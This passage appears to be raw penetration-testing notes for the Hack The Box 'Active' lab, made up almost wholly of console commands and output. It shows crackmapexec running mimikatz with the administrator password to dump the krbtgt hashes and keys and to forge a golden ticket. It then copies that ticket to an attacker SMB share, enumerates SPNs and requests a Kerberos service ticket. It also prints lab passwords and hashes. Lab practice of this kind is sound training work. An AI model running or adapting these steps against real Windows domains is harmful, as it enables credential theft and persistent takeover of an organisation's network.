Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' -M mimikatz -o COMMAND="\"lsadump::lsa /inject /name:krbtgt\""                           
[-] Failed loading module at /usr/lib/python3/dist-packages/cme/modules/slinky.py: No module named 'pylnk3'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
MIMIKATZ    10.10.10.100    445    DC               [+] Executed launcher
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ    10.10.10.100                            [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ    10.10.10.100                            [*] - - "POST / HTTP/1.1" 200 -
MIMIKATZ    10.10.10.100                            
  .#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14                                                                                                                                 
 .## ^ ##.  "A La Vie, A L'Amour"                                                                                                                                                            
 ## / \ ##  /* * *                                                                                                                                                                           
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                                                                         
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)                                                                                                                         
  '#####'                                     with 20 modules * * */                                                                                                                         
                                                                                                                                                                                             
mimikatz(powershell) # lsadump::lsa /inject /name:krbtgt                                                                                                                                     
Domain : ACTIVE / S-1-5-21-405608879-3187717380-1996298813                                                                                                                                   
                                                                                                                                                                                             
RID  : 000001f6 (502)                                                                                                                                                                        
User : krbtgt                                                                                                                                                                                
                                                                                                                                                                                             
 * Primary                                                                                                                                                                                   
    LM   :                                                                                                                                                                                   
    NTLM : b889e0d47d6fe22c8f0463a717f460dc                                                                                                                                                  
                                                                                                                                                                                             
 * WDigest                                                                                                                                                                                   
    01  576dd50433dad36e87d8fd08c5ce7b25                                                                                                                                                     
    02  cb246264d08b168726d686a7e0bbf2c8                                                                                                                                                     
    03  a13becfb4df533a52194bc73de420443                                                                                                                                                     
    04  576dd50433dad36e87d8fd08c5ce7b25                                                                                                                                                     
    05  cb246264d08b168726d686a7e0bbf2c8                                                                                                                                                     
    06  759d779b22da0f6a9f5ea9ba9fd7524f                                                                                                                                                     
    07  576dd50433dad36e87d8fd08c5ce7b25                                                                                                                                                     
    08  08a44cb7ffbc07725430603b80d38310                                                                                                                                                     
    09  08a44cb7ffbc07725430603b80d38310                                                                                                                                                     
    10  c8428142cb4e615949b57178a39757a6                                                                                                                                                     
    11  2bc79dd8e5a0b650daa838f569faad31                                                                                                                                                     
    12  08a44cb7ffbc07725430603b80d38310                                                                                                                                                     
    13  d750bba031369ce6e715805f7b37b577                                                                                                                                                     
    14  2bc79dd8e5a0b650daa838f569faad31                                                                                                                                                     
    15  09f20bb56e4d0bc09933f112766cbe99                                                                                                                                                     
    16  09f20bb56e4d0bc09933f112766cbe99                                                                                                                                                     
    17  7139f067391063feb023c5a151d48cdc                                                                                                                                                     
    18  4a6338508d85ac81bb2c88abb4faba95                                                                                                                                                     
    19  c8fb21b80e7e08c729769c0f55e8320b                                                                                                                                                     
    20  b55e3af97b465512d6552375a2fe53f4                                                                                                                                                     
    21  401f082c8bde889928f413d012c8707a                                                                                                                                                     
    22  401f082c8bde889928f413d012c8707a                                                                                                                                                     
    23  d9fbc541fad8273d51ad89243a52a908                                                                                                                                                     
    24  d9d35c5310ebfe5f6a56eb418faee71c                                                                                                                                                     
    25  d9d35c5310ebfe5f6a56eb418faee71c                                                                                                                                                     
    26  59706d906937afd7670b53f3e0e90bc7                                                                                                                                                     
    27  86f10bf50dbbb414ce1fa2379e4cda62                                                                                                                                                     
    28  2138b4f7f9ed8937b9e7f6a18c48b51e                                                                                                                                                     
    29  7ce0ab1e74419668d3520dc4f75e87ee                                                                                                                                                     
                                                                                                                                                                                             
 * Kerberos                                                                                                                                                                                  
    Default Salt : ACTIVE.HTBkrbtgt                                                                                                                                                          
    Credentials                                                                                                                                                                              
      des_cbc_md5       : 9d044f891adf7629                                                                                                                                                   
                                                                                                                                                                                             
 * Kerberos-Newer-Keys                                                                                                                                                                       
    Default Salt : ACTIVE.HTBkrbtgt                                                                                                                                                          
    Default Iterations : 4096                                                                                                                                                                
    Credentials                                                                                                                                                                              
      aes256_hmac       (4096) : cd80d318efb2f8752767cd619731b6705cf59df462900fb37310b662c9cf51e9                                                                                            
      aes128_hmac       (4096) : b9a02d7bd319781bc1e0a890f69304c3                                                                                                                            
      des_cbc_md5       (4096) : 9d044f891adf7629                                                                                                                                            
                                                                                                                                                                                             
MIMIKATZ    10.10.10.100                            [*] Saved raw Mimikatz output to Mimikatz-10.10.10.100-2022-01-24_022148.log
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' -M mimikatz -o COMMAND="\"kerberos::golden /domain:active.htb /sid:S-1-5-21-405608879-3187717380-1996298813 /rc4:b889e0d47d6fe22c8f0463a717f460dc /user:dc /ticket:golden.kirbi\""
[-] Failed loading module at /usr/lib/python3/dist-packages/cme/modules/slinky.py: No module named 'pylnk3'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
MIMIKATZ    10.10.10.100    445    DC               [+] Executed launcher
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ    10.10.10.100                            [*] - - "GET /Invoke-Mimikatz.ps1 HTTP/1.1" 200 -
MIMIKATZ                                            [*] Waiting on 1 host(s)
MIMIKATZ    10.10.10.100                            [*] - - "POST / HTTP/1.1" 200 -
MIMIKATZ    10.10.10.100                            
  .#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14                                                                                                                                 
 .## ^ ##.  "A La Vie, A L'Amour"                                                                                                                                                            
 ## / \ ##  /* * *                                                                                                                                                                           
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )                                                                                                                         
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)                                                                                                                         
  '#####'                                     with 20 modules * * */                                                                                                                         
                                                                                                                                                                                             
mimikatz(powershell) # kerberos::golden /domain:active.htb /sid:S-1-5-21-405608879-3187717380-1996298813 /rc4:b889e0d47d6fe22c8f0463a717f460dc /user:dc /ticket:golden.kirbi                 
User      : dc                                                                                                                                                                               
Domain    : active.htb (ACTIVE)                                                                                                                                                              
SID       : S-1-5-21-405608879-3187717380-1996298813                                                                                                                                         
User Id   : 500                                                                                                                                                                              
Groups Id : *513 512 520 518 519                                                                                                                                                             
ServiceKey: b889e0d47d6fe22c8f0463a717f460dc - rc4_hmac_nt                                                                                                                                   
Lifetime  : 24/1/2022 9:30:48 ?? ; 22/1/2032 9:30:48 ?? ; 22/1/2032 9:30:48 ??                                                                                                               
-> Ticket : golden.kirbi                                                                                                                                                                     
                                                                                                                                                                                             
 * PAC generated                                                                                                                                                                             
 * PAC signed                                                                                                                                                                                
 * EncTicketPart generated                                                                                                                                                                   
 * EncTicketPart encrypted                                                                                                                                                                   
 * KrbCred generated                                                                                                                                                                         
                                                                                                                                                                                             
Final Ticket Saved to file !                                                                                                                                                                 
                                                                                                                                                                                             
MIMIKATZ    10.10.10.100                            [*] Saved raw Mimikatz output to Mimikatz-10.10.10.100-2022-01-24_022611.log
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' -x 'dir'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
SMB         10.10.10.100    445    DC               [+] Executed command 
SMB         10.10.10.100    445    DC               Volume in drive C has no label.
SMB         10.10.10.100    445    DC               Volume Serial Number is 15BB-D59C
SMB         10.10.10.100    445    DC               
SMB         10.10.10.100    445    DC               Directory of C:\
SMB         10.10.10.100    445    DC               
SMB         10.10.10.100    445    DC               24/01/2022  09:30 ºú             1.315 golden.kirbi
SMB         10.10.10.100    445    DC               14/07/2009  05:20 ºú    <DIR>          PerfLogs
SMB         10.10.10.100    445    DC               12/01/2022  03:11 úú    <DIR>          Program Files
SMB         10.10.10.100    445    DC               21/01/2021  06:49 úú    <DIR>          Program Files (x86)
SMB         10.10.10.100    445    DC               21/07/2018  04:39 úú    <DIR>          Users
SMB         10.10.10.100    445    DC               24/01/2022  09:06 ºú    <DIR>          Windows
SMB         10.10.10.100    445    DC               1 File(s)          1.315 bytes
SMB         10.10.10.100    445    DC               5 Dir(s)   1.166.745.600 bytes free
```
```console
┌──(root💀kali)-[/OSCPv3/htb/Active]
└─# crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968' -x 'copy golden.kirbi \\10.10.14.12\folder\golden.kirbi'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
SMB         10.10.10.100    445    DC               [-] Error starting SMB server on port 445: the port is already in use
SMB         10.10.10.100    445    DC               [+] Executed command 
SMB         10.10.10.100    445    DC               1 file(s) copied.
```

#### Fount SPN
```console
C:\Windows\Temp>setspn -T active -Q */*
Checking domain DC=active,DC=htb
CN=Administrator,CN=Users,DC=active,DC=htb
        active/CIFS:445
CN=DC,OU=Domain Controllers,DC=active,DC=htb
        ldap/DC.active.htb/ForestDnsZones.active.htb
        ldap/DC.active.htb/DomainDnsZones.active.htb
        TERMSRV/DC
        TERMSRV/DC.active.htb
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC.active.htb
        DNS/DC.active.htb
        GC/DC.active.htb/active.htb
        RestrictedKrbHost/DC.active.htb
        RestrictedKrbHost/DC
        HOST/DC/ACTIVE
        HOST/DC.active.htb/ACTIVE
        HOST/DC
        HOST/DC.active.htb
        HOST/DC.active.htb/active.htb
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/f4953ea5-0f30-4041-b4dd-1a00693a8510/active.htb
        ldap/DC/ACTIVE
        ldap/f4953ea5-0f30-4041-b4dd-1a00693a8510._msdcs.active.htb
        ldap/DC.active.htb/ACTIVE
        ldap/DC
        ldap/DC.active.htb
        ldap/DC.active.htb/active.htb
CN=krbtgt,CN=Users,DC=active,DC=htb
        kadmin/changepw

Existing SPN found!
```
```console
C:\Windows\Temp>powershell -ExecutionPolicy Bypass -File querySPN.ps1
 
Name                           Value                                           
----                           -----                                           
samaccounttype                 {805306368}                                     
countrycode                    {0}                                             
cn                             {Administrator}                                 
lastlogoff                     {0}                                             
dscorepropagationdata          {18/7/2018 8:34:35 úú, 18/7/2018 8:14:54 úú, ...
usncreated                     {8196}                                          
objectguid                     {142 113 202 37 18 115 127 70 149 90 76 79 16...
iscriticalsystemobject         {True}                                          
serviceprincipalname           {active/CIFS:445}                               
whenchanged                    {23/1/2022 11:48:07 úú}                         
memberof                       {CN=Group Policy Creator Owners,CN=Users,DC=a...
accountexpires                 {0}                                             
logonhours                     {255 255 255 255 255 255 255 255 255 255 255 ...
primarygroupid                 {513}                                           
badpwdcount                    {0}                                             
objectclass                    {top, person, organizationalPerson, user}       
instancetype                   {4}                                             
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=acti...
whencreated                    {18/7/2018 6:49:11 úú}                          
lastlogon                      {132874655931126202}                            
useraccountcontrol             {66048}                                         
msds-supportedencryptiontypes  {0}                                             
samaccountname                 {Administrator}                                 
adspath                        {LDAP://CN=Administrator,CN=Users,DC=active,D...
description                    {Built-in account for administering the compu...
pwdlastset                     {131764144003517228}                            
logoncount                     {65}                                            
codepage                       {0}                                             
name                           {Administrator}                                 
usnchanged                     {114728}                                        
admincount                     {1}                                             
badpasswordtime                {132874649388942712}                            
objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 175 25 45 24 4 181 ...
distinguishedname              {CN=Administrator,CN=Users,DC=active,DC=htb}    
lastlogontimestamp             {132874552879373202}                            
operatingsystem                {Windows Server 2008 R2 Standard}               
countrycode                    {0}                                             
cn                             {DC}                                            
lastlogoff                     {0}                                             
dscorepropagationdata          {1/1/1601 12:00:00 ºú}                          
usncreated                     {12293}                                         
objectguid                     {243 226 9 10 251 245 228 71 136 99 221 114 1...
iscriticalsystemobject         {True}                                          
serviceprincipalname           {ldap/DC.active.htb/ForestDnsZones.active.htb...
whenchanged                    {23/1/2022 11:47:50 úú}                         
localpolicyflags               {0}                                             
accountexpires                 {9223372036854775807}                           
primarygroupid                 {516}                                           
badpwdcount                    {0}                                             
objectclass                    {top, person, organizationalPerson, user...}    
instancetype                   {4}                                             
msdfsr-computerreferencebl     {CN=DC,CN=Topology,CN=Domain System Volume,CN...
objectcategory                 {CN=Computer,CN=Schema,CN=Configuration,DC=ac...
whencreated                    {18/7/2018 6:50:35 úú}                          
lastlogon                      {132874553154089684}                            
useraccountcontrol             {532480}                                        
msds-supportedencryptiontypes  {31}                                            
samaccountname                 {DC$}                                           
operatingsystemversion         {6.1 (7601)}                                    
samaccounttype                 {805306369}                                     
adspath                        {LDAP://CN=DC,OU=Domain Controllers,DC=active...
serverreferencebl              {CN=DC,CN=Servers,CN=Default-First-Site-Name,...
operatingsystemservicepack     {Service Pack 1}                                
pwdlastset                     {132864616141224714}                            
ridsetreferences               {CN=RID Set,CN=DC,OU=Domain Controllers,DC=ac...
logoncount                     {119}                                           
codepage                       {0}                                             
name                           {DC}                                            
usnchanged                     {114719}                                        
badpasswordtime                {0}                                             
objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 175 25 45 24 4 181 ...
dnshostname                    {DC.active.htb}                                 
distinguishedname              {CN=DC,OU=Domain Controllers,DC=active,DC=htb}  
lastlogontimestamp             {132874552701220889}                            
samaccounttype                 {805306368}                                     
lastlogon                      {0}                                             
dscorepropagationdata          {18/7/2018 7:05:45 úú, 1/1/1601 12:00:00 ºú}    
objectsid                      {1 5 0 0 0 0 0 5 21 0 0 0 175 25 45 24 4 181 ...
whencreated                    {18/7/2018 6:50:35 úú}                          
badpasswordtime                {0}                                             
accountexpires                 {9223372036854775807}                           
iscriticalsystemobject         {True}                                          
name                           {krbtgt}                                        
usnchanged                     {12739}                                         
objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=acti...
description                    {Key Distribution Center Service Account}       
showinadvancedviewonly         {True}                                          
codepage                       {0}                                             
instancetype                   {4}                                             
countrycode                    {0}                                             
distinguishedname              {CN=krbtgt,CN=Users,DC=active,DC=htb}           
cn                             {krbtgt}                                        
admincount                     {1}                                             
serviceprincipalname           {kadmin/changepw}                               
objectclass                    {top, person, organizationalPerson, user}       
logoncount                     {0}                                             
usncreated                     {12324}                                         
useraccountcontrol             {514}                                           
objectguid                     {231 161 215 67 166 165 171 73 130 208 226 78...
primarygroupid                 {513}                                           
lastlogoff                     {0}                                             
samaccountname                 {krbtgt}                                        
badpwdcount                    {0}                                             
whenchanged                    {18/7/2018 7:05:45 úú}                          
memberof                       {CN=Denied RODC Password Replication Group,CN...
pwdlastset                     {131764134369720307}                            
adspath                        {LDAP://CN=krbtgt,CN=Users,DC=active,DC=htb}   
```

```console
C:\Windows\Temp>powershell -ExecutionPolicy Bypass -c "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'kadmin/changepw'; klist"

net use \\dc
powershell -ExecutionPolicy Bypass -c "klist"
```



